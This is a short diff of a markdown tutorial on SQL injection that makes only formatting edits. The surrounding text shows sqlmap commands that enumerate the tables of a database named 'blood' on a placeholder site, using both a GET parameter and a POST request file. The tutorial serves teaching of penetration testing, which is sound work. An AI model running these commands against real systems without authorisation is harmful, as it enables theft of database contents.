@@ -320,17 +320,16 @@ Now that we have the databases, let's extract tables from the database **blood*
 `sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables`
 
 **`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables`  
-**  
+
 **Using POST based Method**
 
 `sqlmap -r req.txt -p blood_group -D blood --tables`
 
 **`sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables`  
-**
 
 Once we run these commands, we should get the tables.
 
-Getting Tables
+Getting Tables:
 
 ```shell-session
 nare@nare$ sqlmap -r req.txt -p blood_group -D blood --tables
